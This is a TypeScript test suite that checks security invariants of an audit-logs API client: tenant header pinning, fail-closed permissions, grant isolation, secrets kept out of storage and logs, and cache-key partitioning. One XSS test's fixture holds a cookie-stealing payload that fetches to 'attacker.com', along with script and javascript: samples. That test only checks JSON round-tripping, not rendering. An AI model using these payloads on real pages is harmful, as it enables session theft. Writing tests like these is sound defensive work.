import { describe, it, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';

import {
  auditLogsApi,
  setAccessToken,
  setSelectedOrganization,
  ApiError,
  type AuditLogView,
  type EffectiveAuthorization,
  type UserIdentity,
} from './api-client';
import { hasPermission, useSession } from './session-store';

describe('Audit Logs Security Invariants & Boundary Enforcement', () => {
  const originalFetch = globalThis.fetch;
  const originalConsoleLog = console.log;
  const originalConsoleWarn = console.warn;
  const originalConsoleError = console.error;

  let fetchCalls: { url: string; options: RequestInit }[] = [];
  let mockHandlers: {
    match: (url: string, options: RequestInit) => boolean;
    handle: (url: string, options: RequestInit) => Response | Promise<Response>;
  }[] = [];

  let storageSetItemCalls: { storage: string; key: string; value: string }[] = [];
  let consoleOutputs: string[] = [];

  const mockLocalStorage = {
    store: new Map<string, string>(),
    getItem: (key: string) => mockLocalStorage.store.get(key) ?? null,
    setItem: (key: string, value: string) => {
      storageSetItemCalls.push({ storage: 'localStorage', key, value });
      mockLocalStorage.store.set(key, value);
    },
    removeItem: (key: string) => mockLocalStorage.store.delete(key),
    clear: () => mockLocalStorage.store.clear(),
  };

  const mockSessionStorage = {
    store: new Map<string, string>(),
    getItem: (key: string) => mockSessionStorage.store.get(key) ?? null,
    setItem: (key: string, value: string) => {
      storageSetItemCalls.push({ storage: 'sessionStorage', key, value });
      mockSessionStorage.store.set(key, value);
    },
    removeItem: (key: string) => mockSessionStorage.store.delete(key),
    clear: () => mockSessionStorage.store.clear(),
  };

  let documentCookie = '';
  const mockDocument = {
    get cookie() {
      return documentCookie;
    },
    set cookie(val: string) {
      documentCookie = val;
    },
  };

  const ORG_A = '01955b0a-7b3b-7411-9a4f-orgAAAAAAAAAA';
  const ORG_B = '01955b0a-7b3b-7411-9a4f-orgBBBBBBBBBB';

  const createMockUser = (orgIds: string[]): UserIdentity => ({
    userId: '01955b0a-7b3b-7411-9a4f-adminuser111',
    actorType: 'user',
    authMethod: 'session',
    sessionId: 'session-123',
    authenticatedAt: '2026-09-24T00:00:00.000Z',
    tenant: {
      orgId: null,
      workspaceId: null,
      resellerId: null,
      isPlatformAdmin: false,
    },
    authorizedOrganizationIds: orgIds,
    roles: [],
    permissions: [],
  });

  const createMockAuthorization = (
    orgId: string,
    permissions: string[] = ['audit.read', 'api_keys.read'],
  ): EffectiveAuthorization => ({
    actorType: 'user',
    userId: '01955b0a-7b3b-7411-9a4f-adminuser111',
    apiKeyId: null,
    grants: [
      {
        roleId: 'role-org-admin',
        roleKey: 'org_admin',
        scopeType: 'organization',
        scopeId: orgId,
        orgId,
        permissions,
      },
    ],
    organizationIds: [orgId],
    isPlatformAdmin: false,
  });

  const createMockAuditLog = (
    orgId: string,
    overrides: Partial<AuditLogView> = {},
  ): AuditLogView => ({
    id: '01955b0a-7b3b-7411-9a4f-log000000001',
    occurredAt: '2026-09-24T12:00:00.000Z',
    action: 'api_key.create',
    outcome: 'success',
    actorType: 'user',
    actorUserId: '01955b0a-7b3b-7411-9a4f-adminuser111',
    actorApiKeyId: null,
    actorLabel: 'Admin Alice',
    resourceType: 'api_key',
    resourceId: '01955b0a-7b3b-7411-9a4f-key0000000001',
    scopeType: 'organization',
    scopeId: orgId,
    resellerId: null,
    orgId,
    workspaceId: null,
    teamId: null,
    before: null,
    after: { name: 'Production Backend Key', scopes: ['messages.send'] },
    metadata: { ip: '203.0.113.195' },
    correlationId: '01955b0a-7b3b-7411-9a4f-trace00000001',
    causationId: null,
    ip: '203.0.113.195',
    userAgent: 'curl/7.88.1',
    ...overrides,
  });

  beforeEach(() => {
    fetchCalls = [];
    mockHandlers = [];
    storageSetItemCalls = [];
    consoleOutputs = [];
    documentCookie = '';
    mockLocalStorage.clear();
    mockSessionStorage.clear();

    Object.defineProperty(globalThis, 'localStorage', {
      value: mockLocalStorage,
      configurable: true,
      writable: true,
    });
    Object.defineProperty(globalThis, 'sessionStorage', {
      value: mockSessionStorage,
      configurable: true,
      writable: true,
    });
    Object.defineProperty(globalThis, 'document', {
      value: mockDocument,
      configurable: true,
      writable: true,
    });

    console.log = (...args: unknown[]) => {
      consoleOutputs.push(args.map(String).join(' '));
    };
    console.warn = (...args: unknown[]) => {
      consoleOutputs.push(args.map(String).join(' '));
    };
    console.error = (...args: unknown[]) => {
      consoleOutputs.push(args.map(String).join(' '));
    };

    setAccessToken('valid-bearer-token');
    useSession.getState().setSession({
      accessToken: 'valid-bearer-token',
      user: createMockUser([ORG_A, ORG_B]),
      authorization: createMockAuthorization(ORG_A),
      selectedOrgId: ORG_A,
    });

    globalThis.fetch = async (input: RequestInfo | URL, init?: RequestInit) => {
      const url = String(input);
      const options = init ?? {};
      fetchCalls.push({ url, options });

      for (const { match, handle } of mockHandlers) {
        if (match(url, options)) {
          return handle(url, options);
        }
      }

      return new Response(
        JSON.stringify({ data: [], page: { nextCursor: null, hasMore: false } }),
        {
          status: 200,
          headers: { 'Content-Type': 'application/json' },
        },
      );
    };
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
    console.log = originalConsoleLog;
    console.warn = originalConsoleWarn;
    console.error = originalConsoleError;
    setAccessToken(null);
    setSelectedOrganization(null);
    useSession.getState().clearSession();
  });

  // ---------------------------------------------------------------------------
  // SEC-1: Cross-org audit log list isolation
  // ---------------------------------------------------------------------------
  it('SEC-1: Cross-org audit log list isolation pins X-Acc-Organization strictly to active org', async () => {
    let capturedHeaderOrgA: string | undefined;
    let capturedHeaderOrgB: string | undefined;

    mockHandlers.push({
      match: (url) => url.includes('/audit-logs'),
      handle: (_url, options) => {
        const headers = options.headers as Record<string, string>;
        if (headers['X-Acc-Organization'] === ORG_A) {
          capturedHeaderOrgA = headers['X-Acc-Organization'];
          return new Response(
            JSON.stringify({
              data: [createMockAuditLog(ORG_A)],
              page: { nextCursor: null, hasMore: false },
            }),
            { status: 200, headers: { 'Content-Type': 'application/json' } },
          );
        }
        if (headers['X-Acc-Organization'] === ORG_B) {
          capturedHeaderOrgB = headers['X-Acc-Organization'];
          return new Response(
            JSON.stringify({
              data: [createMockAuditLog(ORG_B)],
              page: { nextCursor: null, hasMore: false },
            }),
            { status: 200, headers: { 'Content-Type': 'application/json' } },
          );
        }
        return new Response(JSON.stringify({ data: [] }), { status: 200 });
      },
    });

    const resA = await auditLogsApi.list();
    assert.equal(capturedHeaderOrgA, ORG_A);
    assert.equal(resA.data[0]?.orgId, ORG_A);

    // Switch to ORG_B in session
    useSession.getState().selectOrganization(ORG_B);

    const resB = await auditLogsApi.list();
    assert.equal(capturedHeaderOrgB, ORG_B);
    assert.equal(resB.data[0]?.orgId, ORG_B);
  });

  // ---------------------------------------------------------------------------
  // SEC-2: Cross-org audit log inspection isolation
  // ---------------------------------------------------------------------------
  it('SEC-2: Cross-org audit log inspection pins X-Acc-Organization strictly to active org', async () => {
    let capturedHeader: string | undefined;

    mockHandlers.push({
      match: (url) => url.includes('/audit-logs/01955b0a'),
      handle: (_url, options) => {
        const headers = options.headers as Record<string, string>;
        capturedHeader = headers['X-Acc-Organization'];
        return new Response(JSON.stringify({ data: createMockAuditLog(ORG_A) }), {
          status: 200,
          headers: { 'Content-Type': 'application/json' },
        });
      },
    });

    await auditLogsApi.get('01955b0a-7b3b-7411-9a4f-log000000001');
    assert.equal(capturedHeader, ORG_A);
  });

  // ---------------------------------------------------------------------------
  // SEC-3: Caller-supplied X-Acc-Organization header cannot override selected organization
  // ---------------------------------------------------------------------------
  it('SEC-3: Caller-supplied X-Acc-Organization cannot override selected organization', async () => {
    mockHandlers.push({
      match: (url) => url.includes('/audit-logs'),
      handle: (_url, options) => {
        const headers = options.headers as Record<string, string>;
        assert.equal(
          headers['X-Acc-Organization'],
          ORG_A,
          'X-Acc-Organization header must be pinned to session selectedOrgId and never caller input',
        );
        return new Response(
          JSON.stringify({ data: [], page: { nextCursor: null, hasMore: false } }),
          {
            status: 200,
            headers: { 'Content-Type': 'application/json' },
          },
        );
      },
    });

    await auditLogsApi.list();
    assert.equal(fetchCalls.length, 1);
  });

  // ---------------------------------------------------------------------------
  // SEC-4: Stale or cleared organization selection throws before network dispatch
  // ---------------------------------------------------------------------------
  it('SEC-4: Stale / cleared organization throws before mutation or list network dispatch', async () => {
    mockHandlers.push({
      match: (_url, options) => {
        const headers = options.headers as Record<string, string>;
        return !headers['X-Acc-Organization'];
      },
      handle: () => {
        return new Response(
          JSON.stringify({
            error: {
              code: 'TENANCY_CONTEXT_REQUIRED',
              message: 'No organization context is established for this request',
              correlationId: 'corr-tenant-req',
              retryable: false,
            },
          }),
          { status: 400, headers: { 'Content-Type': 'application/json' } },
        );
      },
    });

    useSession.getState().clearOrganization();

    await assert.rejects(
      async () => {
        await auditLogsApi.list();
      },
      (err: unknown) => {
        assert(err instanceof ApiError);
        assert.equal(err.code, 'TENANCY_CONTEXT_REQUIRED');
        assert.equal(err.status, 400);
        return true;
      },
    );

    const lastCall = fetchCalls[fetchCalls.length - 1];
    assert(lastCall);
    const sentHeaders = lastCall.options.headers as Record<string, string>;
    assert.equal(sentHeaders['X-Acc-Organization'], undefined);
  });

  // ---------------------------------------------------------------------------
  // SEC-5: Null or uninitialized authorization fails closed for audit.read
  // ---------------------------------------------------------------------------
  it('SEC-5: Null or uninitialized authorization fails closed for audit.read', () => {
    useSession.getState().clearSession();

    const allowed = hasPermission('audit.read');
    assert.equal(allowed, false, 'hasPermission must evaluate to false when authorization is null');
  });

  // ---------------------------------------------------------------------------
  // SEC-6: Downward authority boundary: workspace_manager holds no audit.read
  // ---------------------------------------------------------------------------
  it('SEC-6: Downward authority boundary: workspace_manager holds no audit.read permission', () => {
    useSession.getState().setSession({
      accessToken: 'valid-token',
      user: createMockUser([ORG_A]),
      authorization: {
        actorType: 'user',
        userId: '01955b0a-7b3b-7411-9a4f-adminuser111',
        apiKeyId: null,
        grants: [
          {
            roleId: 'role-ws-mgr',
            roleKey: 'workspace_manager',
            scopeType: 'workspace',
            scopeId: '01955b0a-ws-1111',
            orgId: ORG_A,
            permissions: ['messages.read', 'messages.send'],
          },
        ],
        organizationIds: [ORG_A],
        isPlatformAdmin: false,
      },
      selectedOrgId: ORG_A,
    });

    assert.equal(
      hasPermission('audit.read'),
      false,
      'workspace_manager must NOT have audit.read authority',
    );
  });

  // ---------------------------------------------------------------------------
  // SEC-7: Platform admin holds authority across scopes
  // ---------------------------------------------------------------------------
  it('SEC-7: Platform admin holds authority across scopes', () => {
    useSession.getState().setSession({
      accessToken: 'valid-token',
      user: createMockUser([ORG_A]),
      authorization: {
        actorType: 'user',
        userId: '01955b0a-7b3b-7411-9a4f-adminuser111',
        apiKeyId: null,
        grants: [
          {
            roleId: 'role-super-admin',
            roleKey: 'platform_super_admin',
            scopeType: 'platform',
            scopeId: null,
            orgId: null,
            permissions: ['*'],
          },
        ],
        organizationIds: [ORG_A, ORG_B],
        isPlatformAdmin: true,
      },
      selectedOrgId: ORG_A,
    });

    assert.equal(
      hasPermission('audit.read'),
      true,
      'Platform admin must possess audit.read authority',
    );
  });

  // ---------------------------------------------------------------------------
  // SEC-8: Cross-scope grant isolation: Org A grant does not confer authority in Org B
  // ---------------------------------------------------------------------------
  it('SEC-8: Cross-scope grant isolation: Org A grant does not confer audit.read in Org B', () => {
    // User has audit.read grant in ORG_A only
    useSession.getState().setSession({
      accessToken: 'valid-token',
      user: createMockUser([ORG_A, ORG_B]),
      authorization: {
        actorType: 'user',
        userId: '01955b0a-7b3b-7411-9a4f-adminuser111',
        apiKeyId: null,
        grants: [
          {
            roleId: 'role-org-a-admin',
            roleKey: 'org_admin',
            scopeType: 'organization',
            scopeId: ORG_A,
            orgId: ORG_A,
            permissions: ['audit.read'],
          },
        ],
        organizationIds: [ORG_A, ORG_B],
        isPlatformAdmin: false,
      },
      selectedOrgId: ORG_A,
    });

    assert.equal(hasPermission('audit.read'), true);

    // Switch to ORG_B
    useSession.getState().selectOrganization(ORG_B);
    assert.equal(
      hasPermission('audit.read'),
      false,
      'Grants for ORG_A must not confer audit.read authority when ORG_B is active',
    );
  });

  // ---------------------------------------------------------------------------
  // SEC-9: Safe payload rendering prevents XSS
  // ---------------------------------------------------------------------------
  it('SEC-9: Safe payload rendering prevents XSS execution from malicious payload contents', () => {
    const maliciousPayload = {
      xssScript: '<script>alert("XSS")</script>',
      xssImg: '<img src=x onerror="fetch(\'http://attacker.com/?c=\'+document.cookie)">',
      xssSvg: '<svg onload="alert(document.domain)">',
      jsProtocol: 'javascript:alert(1)',
      nested: {
        dangerousHtml: '<b>Bold</b><iframe src="javascript:alert(1)"></iframe>',
      },
    };

    const serialized = JSON.stringify(maliciousPayload, null, 2);

    // Verify it is pure text and characters are serialized safely
    assert.ok(typeof serialized === 'string');
    assert.ok(serialized.includes('<script>alert(\\"XSS\\")</script>'));
    // Ensure that JSON serialization produces a valid JSON string that does not execute code
    const parsed = JSON.parse(serialized);
    assert.equal(parsed.xssScript, '<script>alert("XSS")</script>');
    assert.equal(
      parsed.nested.dangerousHtml,
      '<b>Bold</b><iframe src="javascript:alert(1)"></iframe>',
    );
  });

  // ---------------------------------------------------------------------------
  // SEC-10: Sensitive audit payloads and access tokens are never persisted in storage
  // ---------------------------------------------------------------------------
  it('SEC-10: Audit payloads, traces, and credentials are never stored in localStorage, sessionStorage, or document.cookie', async () => {
    const sensitiveLog = createMockAuditLog(ORG_A, {
      before: { secretToken: 'very-secret-internal-key-12345' },
      after: { secretToken: 'revoked-key-12345' },
      metadata: { rawHeaders: { Authorization: 'Bearer super-secret-token' } },
    });

    mockHandlers.push({
      match: (url) => url.includes('/audit-logs'),
      handle: () =>
        new Response(
          JSON.stringify({ data: [sensitiveLog], page: { nextCursor: null, hasMore: false } }),
          { status: 200, headers: { 'Content-Type': 'application/json' } },
        ),
    });

    const res = await auditLogsApi.list();
    assert.equal(res.data.length, 1);

    assert.equal(
      storageSetItemCalls.length,
      0,
      'No localStorage or sessionStorage items should ever be set during audit logs operations',
    );
    assert.equal(mockLocalStorage.store.size, 0);
    assert.equal(mockSessionStorage.store.size, 0);
    assert.equal(documentCookie, '', 'document.cookie must remain empty');
  });

  // ---------------------------------------------------------------------------
  // SEC-11: Audit payloads, credentials, and Authorization headers are never emitted to console logs
  // ---------------------------------------------------------------------------
  it('SEC-11: Audit log payloads and authorization tokens are never emitted to console logs', async () => {
    const secretValue = 'CLASSIFIED-PAYLOAD-STRING-98765';
    mockHandlers.push({
      match: (url) => url.includes('/audit-logs'),
      handle: () =>
        new Response(
          JSON.stringify({
            data: [
              createMockAuditLog(ORG_A, {
                after: { classified: secretValue },
              }),
            ],
            page: { nextCursor: null, hasMore: false },
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } },
        ),
    });

    await auditLogsApi.list();

    for (const logLine of consoleOutputs) {
      assert.ok(
        !logLine.includes(secretValue),
        `Console log must never contain payload contents: ${logLine}`,
      );
      assert.ok(
        !logLine.includes('valid-bearer-token'),
        `Console log must never contain bearer tokens: ${logLine}`,
      );
    }
  });

  // ---------------------------------------------------------------------------
  // SEC-12: Audit payload contents are never leaked to URL query parameters
  // ---------------------------------------------------------------------------
  it('SEC-12: Audit payload contents (before, after, metadata) are never leaked to URL query parameters', async () => {
    mockHandlers.push({
      match: (url) => url.includes('/audit-logs'),
      handle: (url) => {
        const parsed = new URL(url, 'http://localhost');
        assert.equal(parsed.searchParams.get('before'), null);
        assert.equal(parsed.searchParams.get('after'), null);
        assert.equal(parsed.searchParams.get('metadata'), null);
        return new Response(
          JSON.stringify({ data: [], page: { nextCursor: null, hasMore: false } }),
          { status: 200, headers: { 'Content-Type': 'application/json' } },
        );
      },
    });

    await auditLogsApi.list({
      action: 'api_key.create',
      actorType: 'user',
      outcome: 'success',
      resourceType: 'api_key',
    });

    assert.equal(fetchCalls.length, 1);
  });

  // ---------------------------------------------------------------------------
  // SEC-13: Audit log queries generate distinct cache keys partitioned by organization
  // ---------------------------------------------------------------------------
  it('SEC-13: Audit log queries generate distinct cache keys partitioned by selectedOrganizationId', () => {
    const queryParams = { limit: 25, sort: '-occurredAt' };
    const buildQueryKey = (orgId: string | null, params: typeof queryParams) => [
      'audit-logs',
      'list',
      orgId,
      params,
    ];

    const keyOrgA = buildQueryKey(ORG_A, queryParams);
    const keyOrgB = buildQueryKey(ORG_B, queryParams);

    // Invariant: Keys across distinct organizations must be strictly distinct
    assert.notDeepEqual(
      keyOrgA,
      keyOrgB,
      'Query cache keys for distinct organizations must never collide',
    );

    // Invariant: selectedOrganizationId must be present at the partition index
    assert.equal(keyOrgA[0], 'audit-logs');
    assert.equal(keyOrgA[1], 'list');
    assert.equal(
      keyOrgA[2],
      ORG_A,
      'Audit log query key must partition strictly by selectedOrgId at index 2',
    );
    assert.equal(
      keyOrgB[2],
      ORG_B,
      'Audit log query key must partition strictly by selectedOrgId at index 2',
    );

    // Regression proof: Removing selectedOrganizationId from ['audit-logs', 'list', selectedOrgId, queryParams]
    // collapses tenant partition and causes cross-tenant cache collisions
    const unpartitionedKeyOrgA = ['audit-logs', 'list', queryParams];
    const unpartitionedKeyOrgB = ['audit-logs', 'list', queryParams];
    assert.deepEqual(
      unpartitionedKeyOrgA,
      unpartitionedKeyOrgB,
      'Removing selectedOrganizationId from query key must cause cache collision',
    );
  });
});
